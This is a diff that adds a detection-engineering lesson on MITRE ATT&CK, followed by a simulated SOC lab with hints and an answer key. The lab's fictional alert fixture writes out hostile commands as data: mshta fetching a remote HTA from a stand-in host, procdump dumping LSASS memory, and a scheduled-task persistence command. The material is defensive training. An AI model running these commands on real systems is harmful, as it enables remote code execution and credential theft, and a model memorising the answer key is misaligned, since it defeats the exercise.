@@ -1,0 +1,93 @@
+tagline: A detection is only useful if you can say what behavior it catches, what data it needs and what it misses. MITRE ATT&CK is the shared vocabulary for that.
+sheet: sigma
+:: simple
+**Detection engineering** means writing, testing and maintaining the rules that turn logs into alerts. It is software work: a rule has an owner, tests, a version and a retirement date.
+
+**MITRE ATT&CK** is a public catalog of how real attackers behave, organized as a matrix:
+
+- **Tactic** = the goal (the "why"): Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact.
+- **Technique** = how they do it, with an ID like **T1059** (Command and Scripting Interpreter). Many have **sub-techniques** like **T1059.001** (PowerShell).
+- **Procedure** = the exact way one group or tool does it.
+
+Mapping a rule to a technique lets a team count coverage, compare tools and talk about gaps without arguing about words.
+
+> ATT&CK is a map of behaviors, not a checklist to finish. "Covered" on a heatmap does not mean "detected reliably".
+:: mid
+### The detection lifecycle
+1. **Pick a behavior**: from threat intel, an incident, a red-team report or a coverage gap.
+2. **Find the data**: which log shows it (process creation, DNS, proxy, auth, cloud audit)? If nothing logs it, the first fix is logging, not a rule.
+3. **Write the rule**, usually in Sigma so it is portable.
+4. **Test**: replay the real behavior (a lab host, or an atomic test) and confirm it fires. Run it against a week of normal logs to count false positives.
+5. **Deploy and tune**: allow-list known-good, set severity, add a response note.
+6. **Review**: rules rot as software and attackers change. Re-test on a schedule.
+
+### Data sources and quality
+A rule on `process_creation` needs command lines, not just process names. On Windows that means Sysmon event 1 or Security event 4688 **with command-line auditing on**. No log means no detection, however clever the rule.
+
+### Behavior beats indicators
+Hashes and IPs die in hours. A rule for "Office app spawns a shell" or "LSASS opened by a non-system process" survives tool changes. The **pyramid of pain** ranks it: hashes are trivial for an attacker to change, tools and TTPs are painful.
+
+### Precision and recall
+A noisy rule that analysts ignore detects nothing. Track **true positives, false positives** and **time to triage** per rule. Prefer a few well-tuned rules to many raw ones.
+:: complex
+### Coverage thinking
+Map each rule to technique and sub-technique, then ask per technique: which data source, which rules, how tested, what bypass is known. Gaps found this way become the backlog. Beware vanity coverage: one weak rule on a technique with a hundred variants is not coverage. Weight by what actually targets you (your sector's threat groups) rather than the full matrix.
+
+### Detection-as-code
+Rules live in git, get a pull request review, run unit tests (sample log in, expected alert out) in CI, and deploy through a pipeline. Each rule carries metadata: ATT&CK tags, owner, data source, false-positive notes, severity, last test date.
+
+### Bypass-minded review
+For each rule ask how an attacker evades it: rename the binary (so don't key on the file name alone), change flag order, use an alternate tool for the same technique, run from memory. Good rules key on **the behavior or an artifact the technique requires**, such as a specific access mask on LSASS or a parent-child process pair.
+
+### Layers of detection
+Signature (known bad), behavior (suspicious pattern), anomaly (rare for this host or user) and correlation (several weak signals together). Use all four, and send each alert with enough context that the analyst can decide in minutes.
+:: ref
+### ATT&CK vocabulary
+tactic | the attacker's goal at that step, such as Persistence
+technique (T1059) | a way to reach a tactic, with a numeric ID
+sub-technique (T1059.001) | a specific variant, here PowerShell
+procedure | how one named actor or tool performs the technique
+data source | the log type that shows the behavior, such as Process Creation
+### Detection terms
+true positive | alert fired on real malicious activity
+false positive | alert fired on benign activity
+false negative | malicious activity that produced no alert
+detection-as-code | rules stored, tested and deployed like software
+pyramid of pain | hashes < IPs < domains < artifacts < tools < TTPs, in how hard they are for an attacker to change
+:: lab
+host: analyst
+user: analyst
+cwd: /home/analyst
+:: brief
+**Scenario (fictional, simulated):** the SOC at **Fabrikam Tools** exported this week's alerts to `~/alerts/alerts.txt`, and `~/alerts/attack-ids.txt` lists ATT&CK technique IDs with names. Start with `cat ~/alerts/README.txt`.
+
+One alert, **ALERT-4**, says "mshta launching remote HTA content". Look up its technique ID in the reference list. Submit the **technique ID**, for example `submit T1234`.
+:: answer
+T1218.005
+:: hint
+Read the alert, then search the reference for the tool name: `grep -i mshta ~/alerts/attack-ids.txt`.
+:: hint
+The answer is a sub-technique (it has a dot). Submit the ID exactly as the list shows it.
+:: solution
+`mshta.exe` is a signed Microsoft binary that runs HTA scripts, including from a URL. Attackers use it to proxy execution of code through a trusted binary, which ATT&CK files under **T1218 System Binary Proxy Execution**, sub-technique **T1218.005 Mshta**. The tactic is Defense Evasion. A good rule would key on mshta with an http(s) argument or a child process like powershell.
+:: verify
+cat ~/alerts/alerts.txt
+grep -i mshta ~/alerts/attack-ids.txt
+:: file /home/analyst/alerts/README.txt
+Fabrikam Tools weekly alert export (FICTIONAL, simulated).
+  alerts.txt      id | rule | host | detail
+  attack-ids.txt  technique id | name | tactic
+:: file /home/analyst/alerts/alerts.txt
+ALERT-1 | office-spawns-shell | ws-014 | WINWORD.EXE -> cmd.exe /c whoami
+ALERT-2 | many-failed-logons | srv-02 | 41 failures for user svc-backup in 3 min
+ALERT-3 | new-scheduled-task | ws-022 | schtasks /create /tn Updater /tr C:\Users\Public\u.exe
+ALERT-4 | mshta-remote-content | ws-031 | mshta.exe http://cdn.example.test/p.hta
+ALERT-5 | lsass-access | srv-02 | procdump.exe -ma lsass.exe
+:: file /home/analyst/alerts/attack-ids.txt
+T1059.003 | Windows Command Shell | Execution
+T1110.001 | Password Guessing | Credential Access
+T1053.005 | Scheduled Task | Persistence
+T1218.005 | Mshta | Defense Evasion
+T1003.001 | LSASS Memory | Credential Access
+T1566.001 | Spearphishing Attachment | Initial Access
+T1218.011 | Rundll32 | Defense Evasion
